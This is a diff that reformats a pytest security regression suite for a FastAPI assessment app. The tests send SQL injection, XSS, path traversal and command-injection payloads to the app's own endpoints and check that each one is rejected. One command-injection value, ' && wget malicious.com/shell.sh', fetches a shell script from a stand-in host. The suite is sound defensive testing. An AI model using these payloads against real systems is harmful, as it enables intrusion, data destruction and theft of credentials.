@@ -18,12 +18,13 @@ Priority: P0 (Critical)
 Coverage Target: 100% of critical security paths
 """
 
+from unittest.mock import Mock, patch
+
 import pytest
 from httpx import AsyncClient
-from unittest.mock import patch, Mock
 
-from app.main import app
 from app.db.models.user import User
+from app.main import app
 from tests.conftest import fake
 
 
@@ -34,19 +35,24 @@ class TestSQLInjectionRegression:
     """
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("sql_payload", [
-        "admin'--",
-        "' OR '1'='1",
-        "'; DROP TABLE users; --",
-        "admin' UNION SELECT * FROM users--",
-        "'; INSERT INTO users VALUES('hacker','pass'); --",
-        "1' AND 1=1--",
-        "admin' /*",
-        "' OR 1=1#",
-        "'; EXEC xp_cmdshell('dir'); --",
-        "'; DELETE FROM users WHERE 1=1; --"
-    ])
-    async def test_sql_injection_auth_email(self, client: AsyncClient, sql_payload: str):
+    @pytest.mark.parametrize(
+        "sql_payload",
+        [
+            "admin'--",
+            "' OR '1'='1",
+            "'; DROP TABLE users; --",
+            "admin' UNION SELECT * FROM users--",
+            "'; INSERT INTO users VALUES('hacker','pass'); --",
+            "1' AND 1=1--",
+            "admin' /*",
+            "' OR 1=1#",
+            "'; EXEC xp_cmdshell('dir'); --",
+            "'; DELETE FROM users WHERE 1=1; --",
+        ],
+    )
+    async def test_sql_injection_auth_email(
+        self, client: AsyncClient, sql_payload: str
+    ):
         """
         Test: SQL injection in email field during login
 
@@ -58,29 +64,34 @@ class TestSQLInjectionRegression:
         """
         response = await client.post(
             "/api/v1/auth/token-fixed",
-            data={
-                "username": sql_payload,
-                "password": "TestPassword123!"
-            }
+            data={"username": sql_payload, "password": "TestPassword123!"},
         )
 
         # Should not return 500 (SQL error)
-        assert response.status_code in [400, 401], f"Status {response.status_code} suggests SQL injection vulnerability"
+        assert response.status_code in [
+            400,
+            401,
+        ], f"Status {response.status_code} suggests SQL injection vulnerability"
 
         # Error message should not contain SQL details
         if response.status_code == 500:
             pytest.fail("SQL injection vulnerability detected - 500 error returned")
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("sql_payload", [
-        "'; DROP TABLE assessments; --",
-        "1' OR '1'='1",
-        "assessment' UNION SELECT * FROM users--",
-        "'; DELETE FROM assessments WHERE 1=1; --",
-        "1'; DROP TABLE responses--",
-        "admin' OR 1=1#"
-    ])
-    async def test_sql_injection_assessment_search(self, client: AsyncClient, auth_headers: dict, sql_payload: str):
+    @pytest.mark.parametrize(
+        "sql_payload",
+        [
+            "'; DROP TABLE assessments; --",
+            "1' OR '1'='1",
+            "assessment' UNION SELECT * FROM users--",
+            "'; DELETE FROM assessments WHERE 1=1; --",
+            "1'; DROP TABLE responses--",
+            "admin' OR 1=1#",
+        ],
+    )
+    async def test_sql_injection_assessment_search(
+        self, client: AsyncClient, auth_headers: dict, sql_payload: str
+    ):
         """
         Test: SQL injection in search parameter
 
@@ -90,12 +101,14 @@ class TestSQLInjectionRegression:
         OWASP: A03:2021 - Injection
         """
         response = await client.get(
-            f"/api/v1/assessments/?search={sql_payload}",
-            headers=auth_headers
+            f"/api/v1/assessments/?search={sql_payload}", headers=auth_headers
         )
 
         # Should not return 500 (SQL error)
-        assert response.status_code in [200, 400], f"Status {response.status_code} suggests SQL injection vulnerability"
+        assert response.status_code in [
+            200,
+            400,
+        ], f"Status {response.status_code} suggests SQL injection vulnerability"
 
         # If 200, should return empty or safe results (not SQL errors)
         if response.status_code == 200:
@@ -105,14 +118,19 @@ class TestSQLInjectionRegression:
             assert "ERROR" not in str(data).upper() or "data" in data
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("sql_payload", [
-        "'; UPDATE users SET role='admin' WHERE id=1--",
-        "' OR '1'='1'--",
-        "admin'; DROP TABLE responses--",
-        "'; DELETE FROM audit_logs--",
-        "1' UNION SELECT username, password FROM users--"
-    ])
-    async def test_sql_injection_response_text(self, client: AsyncClient, auth_headers: dict, test_assessment, sql_payload: str):
+    @pytest.mark.parametrize(
+        "sql_payload",
+        [
+            "'; UPDATE users SET role='admin' WHERE id=1--",
+            "' OR '1'='1'--",
+            "admin'; DROP TABLE responses--",
+            "'; DELETE FROM audit_logs--",
+            "1' UNION SELECT username, password FROM users--",
+        ],
+    )
+    async def test_sql_injection_response_text(
+        self, client: AsyncClient, auth_headers: dict, test_assessment, sql_payload: str
+    ):
         """
         Test: SQL injection in response text
 
@@ -125,11 +143,9 @@ class TestSQLInjectionRegression:
             f"/api/v1/responses/",
             json={
                 "assessment_id": str(test_assessment.id),
-                "responses": {
-                    "q1": sql_payload
-                }
+                "responses": {"q1": sql_payload},
             },
-            headers=auth_headers
+            headers=auth_headers,
         )
 
         # Should either reject (400) or sanitize
@@ -148,19 +164,28 @@ class TestXSSRegression:
     """
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>alert('xss')</script>",
-        "<img src=x onerror=alert('xss')>",
-        "javascript:alert('xss')",
-        "';alert('xss');//",
-        "<svg onload=alert('xss')>",
-        "<iframe src='javascript:alert(`xss`)'></iframe>",
-        "<body onload=alert('xss')>",
-        "<input onfocus=alert('xss') autofocus>",
-        "<select onfocus=alert('xss') autofocus>",
-        "<textarea onfocus=alert('xss') autofocus>"
-    ])
-    async def test_xss_in_assessment_title(self, client: AsyncClient, auth_headers: dict, test_organization, xss_payload: str):
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')",
+            "';alert('xss');//",
+            "<svg onload=alert('xss')>",
+            "<iframe src='javascript:alert(`xss`)'></iframe>",
+            "<body onload=alert('xss')>",
+            "<input onfocus=alert('xss') autofocus>",
+            "<select onfocus=alert('xss') autofocus>",
+            "<textarea onfocus=alert('xss') autofocus>",
+        ],
+    )
+    async def test_xss_in_assessment_title(
+        self,
+        client: AsyncClient,
+        auth_headers: dict,
+        test_organization,
+        xss_payload: str,
+    ):
         """
         Test: XSS in assessment title
 
@@ -175,9 +200,9 @@ class TestXSSRegression:
                 "title": xss_payload,
                 "description": "Test assessment",
                 "category": "personality",
-                "organization_id": test_organization.id
+                "organization_id": test_organization.id,
             },
-            headers=auth_headers
+            headers=auth_headers,
         )
 
         if response.status_code in [200, 201]:
@@ -192,14 +217,19 @@ class TestXSSRegression:
             assert "onload=" not in title.lower()
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>alert('xss')</script>",
-        "<img src=x onerror=alert('xss')>",
-        "javascript:alert('xss')",
-        "<svg/onload=alert('xss')>",
-        "'><script>alert(String.fromCharCode(88,83,83))</script>"
-    ])
-    async def test_xss_in_response_text(self, client: AsyncClient, auth_headers: dict, test_assessment, xss_payload: str):
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')",
+            "<svg/onload=alert('xss')>",
+            "'><script>alert(String.fromCharCode(88,83,83))</script>",
+        ],
+    )
+    async def test_xss_in_response_text(
+        self, client: AsyncClient, auth_headers: dict, test_assessment, xss_payload: str
+    ):
         """
         Test: XSS in response text
 
@@ -212,11 +242,9 @@ class TestXSSRegression:
             f"/api/v1/responses/",
             json={
                 "assessment_id": str(test_assessment.id),
-                "responses": {
-                    "q1": xss_payload
-                }
+                "responses": {"q1": xss_payload},
             },
-            headers=auth_headers
+            headers=auth_headers,
         )
 
         if response.status_code in [200, 201]:
@@ -230,13 +258,18 @@ class TestXSSRegression:
             assert "onerror=" not in response_text.lower()
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>alert('xss')</script>",
-        "<img src=x onerror=alert('xss')>",
-        "';alert('xss');//",
-        "<svg onload=alert('xss')>"
-    ])
-    async def test_xss_in_user_profile(self, client: AsyncClient, auth_headers: dict, xss_payload: str):
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "';alert('xss');//",
+            "<svg onload=alert('xss')>",
+        ],
+    )
+    async def test_xss_in_user_profile(
+        self, client: AsyncClient, auth_headers: dict, xss_payload: str
+    ):
         """
         Test: XSS in user profile fields
 
@@ -247,11 +280,8 @@ class TestXSSRegression:
         """
         response = await client.put(
             "/api/v1/users/me",
-            json={
-                "full_name": xss_payload,
-                "bio": f"Bio with {xss_payload}"
-            },
-            headers=auth_headers
+            json={"full_name": xss_payload, "bio": f"Bio with {xss_payload}"},
+            headers=auth_headers,
         )
 
         if response.status_code == 200:
@@ -276,10 +306,11 @@ class TestAuthenticationSecurityRegression:
         OWASP: A02:2021 - Cryptographic Failures
         Security: Critical
         """
+        from sqlalchemy import select
+
+        from app.db.models.user import User, UserRole
         from app.schemas.user import UserCreate
         from app.services.user_service import create_user
-        from app.db.models.user import User, UserRole
-        from sqlalchemy import select
 
         email = fake.email()
         password = "TestPassword123!"
@@ -289,7 +320,7 @@ class TestAuthenticationSecurityRegression:
             full_name=fake.name(),
             role=UserRole.USER,
             is_active=True,
-            password=password
+            password=password,
         )
         user = await create_user(user_data, test_db)
 
@@ -301,13 +332,17 @@ class TestAuthenticationSecurityRegression:
         assert db_user.password_hash is not None
 
         # Verify it's a bcrypt hash (starts with $2b$)
-        assert db_user.password_hash.startswith("$2b$"), "Password not properly hashed with bcrypt"
+        assert db_user.password_hash.startswith(
+            "$2b$"
+        ), "Password not properly hashed with bcrypt"
 
         # Verify password not stored plaintext
         assert password not in db_user.password_hash, "Password stored in plaintext!"
 
     @pytest.mark.asyncio
-    async def test_token_expiration_enforced(self, client: AsyncClient, test_user: User):
+    async def test_token_expiration_enforced(
+        self, client: AsyncClient, test_user: User
+    ):
         """
         Test: Verify token expiration is enforced
 
@@ -316,18 +351,19 @@ class TestAuthenticationSecurityRegression:
         Priority: P0
         OWASP: A07:2021 - Identification and Authentication Failures
         """
-        from app.core.security import create_access_token
         from datetime import timedelta
+
+        from app.services.security import create_access_token
 
         # Create expired token
         expired_token = create_access_token(
             data={"sub": test_user.email, "user_id": test_user.id},
-            expires_delta=timedelta(seconds=-1)  # Expired
+            expires_delta=timedelta(seconds=-1),  # Expired
         )
 
         response = await client.get(
             "/api/v1/auth/me-fixed",
-            headers={"Authorization": f"Bearer {expired_token}"}
+            headers={"Authorization": f"Bearer {expired_token}"},
         )
 
         assert response.status_code == 401, "Expired token should be rejected"
@@ -342,7 +378,7 @@ class TestAuthenticationSecurityRegression:
         Priority: P0
         OWASP: A07:2021 - Identification and Authentication Failures
         """
-        from app.core.security import create_access_token
+        from app.services.security import create_access_token
 
         valid_token = create_access_token(
             data={"sub": test_user.email, "user_id": test_user.id}
@@ -353,7 +389,7 @@ class TestAuthenticationSecurityRegression:
 
         response = await client.get(
             "/api/v1/auth/me-fixed",
-            headers={"Authorization": f"Bearer {tampered_token}"}
+            headers={"Authorization": f"Bearer {tampered_token}"},
         )
 
         assert response.status_code == 401, "Tampered token should be rejected"
@@ -372,10 +408,7 @@ class TestAuthenticationSecurityRegression:
         for i in range(10):
             response = await client.post(
                 "/api/v1/auth/token-fixed",
-                data={
-                    "username": test_user.email,
-                    "password": "WrongPassword123!"
-                }
+                data={"username": test_user.email, "password": "WrongPassword123!"},
             )
 
             # Should eventually be rate limited
@@ -385,10 +418,7 @@ class TestAuthenticationSecurityRegression:
         # After many attempts, should be rate limited
         response = await client.post(
             "/api/v1/auth/token-fixed",
-            data={
-                "username": test_user.email,
-                "password": "WrongPassword123!"
-            }
+            data={"username": test_user.email, "password": "WrongPassword123!"},
         )
 
         # Either rate limited (429) or auth failure (401)
@@ -402,7 +432,9 @@ class TestAuthorizationSecurityRegression:
     """
 
     @pytest.mark.asyncio
-    async def test_idor_assessment_access(self, client: AsyncClient, test_db, test_user: User, test_admin: User):
+    async def test_idor_assessment_access(
+        self, client: AsyncClient, test_db, test_user: User, test_admin: User
+    ):
         """
         Test: IDOR (Insecure Direct Object Reference) in assessment access
 
@@ -412,8 +444,12 @@ class TestAuthorizationSecurityRegression:
         OWASP: A01:2021 - Broken Access Control
         Security: Critical
         """
-        from app.db.models.assessment import Assessment, AssessmentCategory, AssessmentStatus
-        from app.core.security import create_access_token
+        from app.db.models.assessment import (
+            Assessment,
+            AssessmentCategory,
+            AssessmentStatus,
+        )
+        from app.services.security import create_access_token
 
         # Create private assessment as admin
         assessment = Assessment(
@@ -422,24 +458,34 @@ class TestAuthorizationSecurityRegression:
             category=AssessmentCategory.PERSONALITY,
             status=AssessmentStatus.DRAFT,
             is_public=False,
-            created_by_id=test_admin.id
+            created_by_id=test_admin.id,
         )
         test_db.add(assessment)
         await test_db.commit()
 
         # Try to access as regular user
-        token = create_access_token(data={"sub": test_user.email, "user_id": test_user.id})
+        token = create_access_token(
+            data={"sub": test_user.email, "user_id": test_user.id}
+        )
         headers = {"Authorization": f"Bearer {token}"}
 
         response = await client.get(
-            f"/api/v1/assessments/{assessment.id}",
-            headers=headers
+            f"/api/v1/assessments/{assessment.id}", headers=headers
         )
 
-        assert response.status_code == 403, "IDOR vulnerability: User can access private assessment"
+        assert (
+            response.status_code == 403
+        ), "IDOR vulnerability: User can access private assessment"
 
     @pytest.mark.asyncio
-    async def test_idor_response_access(self, client: AsyncClient, test_db, test_user: User, test_admin: User, test_assessment):
+    async def test_idor_response_access(
+        self,
+        client: AsyncClient,
+        test_db,
+        test_user: User,
+        test_admin: User,
+        test_assessment,
+    ):
         """
         Test: IDOR in response access
 
@@ -448,33 +494,39 @@ class TestAuthorizationSecurityRegression:
         Priority: P0
         OWASP: A01:2021 - Broken Access Control
         """
-        from app.db.models.response import Response
-        from app.core.security import create_access_token
         from uuid import uuid4
+
+        from app.db.models.response import Response
+        from app.services.security import create_access_token
 
         # Create response as admin
         response = Response(
             assessment_id=test_assessment.id,
             user_id=test_admin.id,
             question_id=uuid4(),
-            answer_value=5
+            answer_value=5,
         )
         test_db.add(response)
         await test_db.commit()
 
         # Try to access as regular user
-        token = create_access_token(data={"sub": test_user.email, "user_id": test_user.id})
+        token = create_access_token(
+            data={"sub": test_user.email, "user_id": test_user.id}
+        )
         headers = {"Authorization": f"Bearer {token}"}
 
         api_response = await client.get(
-            f"/api/v1/responses/{response.id}",
-            headers=headers
+            f"/api/v1/responses/{response.id}", headers=headers
         )
 
-        assert api_response.status_code == 403, "IDOR vulnerability: User can access another user's response"
+        assert (
+            api_response.status_code == 403
+        ), "IDOR vulnerability: User can access another user's response"
 
     @pytest.mark.asyncio
-    async def test_horizontal_privilege_escalation(self, client: AsyncClient, test_user: User):
+    async def test_horizontal_privilege_escalation(
+        self, client: AsyncClient, test_user: User
+    ):
         """
         Test: Horizontal privilege escalation
 
@@ -483,21 +535,25 @@ class TestAuthorizationSecurityRegression:
         Priority: P0
         OWASP: A01:2021 - Broken Access Control
         """
-        from app.core.security import create_access_token
+        from app.services.security import create_access_token
 
-        token = create_access_token(data={"sub": test_user.email, "user_id": test_user.id})
+        token = create_access_token(
+            data={"sub": test_user.email, "user_id": test_user.id}
+        )
         headers = {"Authorization": f"Bearer {token}"}
 
         # Try to access admin endpoint
-        response = await client.get(
-            "/api/v1/admin/users",
-            headers=headers
-        )
+        response = await client.get("/api/v1/admin/users", headers=headers)
 
-        assert response.status_code in [403, 404], "Horizontal privilege escalation possible"
+        assert response.status_code in [
+            403,
+            404,
+        ], "Horizontal privilege escalation possible"
 
     @pytest.mark.asyncio
-    async def test_unauthorized_assessment_deletion(self, client: AsyncClient, test_assessment, test_user: User):
+    async def test_unauthorized_assessment_deletion(
+        self, client: AsyncClient, test_assessment, test_user: User
+    ):
         """
         Test: Unauthorized assessment deletion
 
@@ -506,15 +562,16 @@ class TestAuthorizationSecurityRegression:
         Priority: P0
         OWASP: A01:2021 - Broken Access Control
         """
-        from app.core.security import create_access_token
+        from app.services.security import create_access_token
 
         # Create token for different user
-        token = create_access_token(data={"sub": "other@example.com", "user_id": str(test_user.id)})
+        token = create_access_token(
+            data={"sub": "other@example.com", "user_id": str(test_user.id)}
+        )
         headers = {"Authorization": f"Bearer {token}"}
 
         response = await client.delete(
-            f"/api/v1/assessments/{test_assessment.id}",
-            headers=headers
+            f"/api/v1/assessments/{test_assessment.id}", headers=headers
         )
 
         assert response.status_code == 403, "Unauthorized deletion possible"
@@ -527,7 +584,9 @@ class TestRateLimitingRegression:
     """
 
     @pytest.mark.asyncio
-    async def test_rate_limit_login_endpoint(self, client: AsyncClient, test_user: User):
+    async def test_rate_limit_login_endpoint(
+        self, client: AsyncClient, test_user: User
+    ):
         """
         Test: Login endpoint rate limiting
 
@@ -540,23 +599,21 @@ class TestRateLimitingRegression:
         for i in range(5):
             response = await client.post(
                 "/api/v1/auth/token-fixed",
-                data={
-                    "username": test_user.email,
-                    "password": "WrongPassword123!"
-                }
+                data={"username": test_user.email, "password": "WrongPassword123!"},
             )
-            assert response.status_code == 401, f"Expected 401, got {response.status_code}"
+            assert (
+                response.status_code == 401
+            ), f"Expected 401, got {response.status_code}"
 
         # 6th attempt should be rate limited
         response = await client.post(
             "/api/v1/auth/token-fixed",
-            data={
-                "username": test_user.email,
-                "password": "WrongPassword123!"
-            }
+            data={"username": test_user.email, "password": "WrongPassword123!"},
         )
 
-        assert response.status_code == 429, f"Expected 429 rate limit, got {response.status_code}"
+        assert (
+            response.status_code == 429
+        ), f"Expected 429 rate limit, got {response.status_code}"
 
     @pytest.mark.asyncio
     async def test_rate_limit_registration_endpoint(self, client: AsyncClient):
@@ -575,8 +632,8 @@ class TestRateLimitingRegression:
                 data={
                     "email": fake.email(),
                     "password": "StrongPassword123!",
-                    "full_name": fake.name()
-                }
+                    "full_name": fake.name(),
+                },
             )
             assert response.status_code != 429, f"Rate limited too early: attempt {i+1}"
 
@@ -586,14 +643,16 @@ class TestRateLimitingRegression:
             data={
                 "email": fake.email(),
                 "password": "StrongPassword123!",
-                "full_name": fake.name()
-            }
+                "full_name": fake.name(),
+            },
         )
 
         assert response.status_code == 429, "Registration rate limiting not working"
 
     @pytest.mark.asyncio
-    async def test_rate_limit_api_endpoints(self, client: AsyncClient, auth_headers: dict):
+    async def test_rate_limit_api_endpoints(
+        self, client: AsyncClient, auth_headers: dict
+    ):
         """
         Test: API endpoint rate limiting
 
@@ -604,10 +663,7 @@ class TestRateLimitingRegression:
         # Make many rapid requests
         responses = []
         for i in range(200):  # High number to trigger rate limit
-            response = await client.get(
-                "/api/v1/assessments/",
-                headers=auth_headers
-            )
+            response = await client.get("/api/v1/assessments/", headers=auth_headers)
             responses.append(response)
             if response.status_code == 429:
                 break  # Rate limit detected
@@ -627,14 +683,19 @@ class TestOtherSecurityVulnerabilities:
     """
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("path_payload", [
-        "../../../etc/passwd",
-        "..\\..\\..\\windows\\system32",
-        "....//....//....//etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%252f..%252f..%252fetc%252fpasswd"
-    ])
-    async def test_path_traversal(self, client: AsyncClient, auth_headers: dict, path_payload: str):
+    @pytest.mark.parametrize(
+        "path_payload",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+        ],
+    )
+    async def test_path_traversal(
+        self, client: AsyncClient, auth_headers: dict, path_payload: str
+    ):
         """
         Test: Path traversal attack protection
 
@@ -648,7 +709,7 @@ class TestOtherSecurityVulnerabilities:
             "/api/v1/upload",  # Assuming upload endpoint exists
             files={"file": ("test.txt", b"test content")},
             data={"path": path_payload},
-            headers=auth_headers
+            headers=auth_headers,
         )
 
         # Should not succeed (404 if endpoint doesn't exist, or 400/403 if path blocked)
@@ -658,15 +719,20 @@ class TestOtherSecurityVulnerabilities:
             assert "root:" not in response.text
 
     @pytest.mark.asyncio
-    @pytest.mark.parametrize("cmd_payload", [
-        "; ls -la",
-        "| cat /etc/passwd",
-        "& echo 'hack'",
-        "`whoami`",
-        "$(id)",
-        " && wget malicious.com/shell.sh"
-    ])
-    async def test_command_injection(self, client: AsyncClient, auth_headers: dict, cmd_payload: str):
+    @pytest.mark.parametrize(
+        "cmd_payload",
+        [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "& echo 'hack'",
+            "`whoami`",
+            "$(id)",
+            " && wget malicious.com/shell.sh",
+        ],
+    )
+    async def test_command_injection(
+        self, client: AsyncClient, auth_headers: dict, cmd_payload: str
+    ):
         """
         Test: Command injection protection
 
@@ -681,9 +747,9 @@ class TestOtherSecurityVulnerabilities:
             json={
                 "title": f"Test {cmd_payload}",
                 "description": "Test",
-                "category": "personality"
+                "category": "personality",
             },
-            headers=auth_headers
+            headers=auth_headers,
         )
 
         # Should not execute commands
@@ -703,10 +769,7 @@ class TestOtherSecurityVulnerabilities:
         # Login to get CSRF token
         login_response = await client.post(
             "/api/v1/auth/token-fixed",
-            data={
-                "username": test_user.email,
-                "password": "TestPassword123!"
-            }
+            data={"username": test_user.email, "password": "TestPassword123!"},
         )
 
         csrf_token = login_response.cookies.get("csrf_token")
@@ -716,8 +779,14 @@ class TestOtherSecurityVulnerabilities:
         # If CSRF is enforced, this should fail
         response = await client.post(
             "/api/v1/assessments/",
-            json={"title": "CSRF Test", "description": "Test", "category": "personality"},
-            headers={"Authorization": f"Bearer {login_response.cookies.get('access_token')}"}
+            json={
+                "title": "CSRF Test",
+                "description": "Test",
+                "category": "personality",
+            },
+            headers={
+                "Authorization": f"Bearer {login_response.cookies.get('access_token')}"
+            },
         )
 
         # CSRF may or may not be enforced in the API
@@ -727,7 +796,9 @@ class TestOtherSecurityVulnerabilities:
             pass
 
     @pytest.mark.asyncio
-    async def test_sensitive_data_exposure(self, client: AsyncClient, auth_headers: dict):
+    async def test_sensitive_data_exposure(
+        self, client: AsyncClient, auth_headers: dict
+    ):
         """
         Test: Verify sensitive data not exposed in error messages
 
@@ -737,10 +808,7 @@ class TestOtherSecurityVulnerabilities:
         OWASP: A05:2021 - Security Misconfiguration
         """
         # Trigger error with invalid input
-        response = await client.get(
-            "/api/v1/assessments/999999",
-            headers=auth_headers
-        )
+        response = await client.get("/api/v1/assessments/999999", headers=auth_headers)
 
         if response.status_code == 500:
             error_text = response.text.lower()
@@ -756,7 +824,11 @@ class TestOtherSecurityVulnerabilities:
 # Test class markers
 TestSQLInjectionRegression = pytest.mark.P0(TestSQLInjectionRegression)
 TestXSSRegression = pytest.mark.P0(TestXSSRegression)
-TestAuthenticationSecurityRegression = pytest.mark.P0(TestAuthenticationSecurityRegression)
-TestAuthorizationSecurityRegression = pytest.mark.P0(TestAuthorizationSecurityRegression)
+TestAuthenticationSecurityRegression = pytest.mark.P0(
+    TestAuthenticationSecurityRegression
+)
+TestAuthorizationSecurityRegression = pytest.mark.P0(
+    TestAuthorizationSecurityRegression
+)
 TestRateLimitingRegression = pytest.mark.P0(TestRateLimitingRegression)
 TestOtherSecurityVulnerabilities = pytest.mark.P0(TestOtherSecurityVulnerabilities)
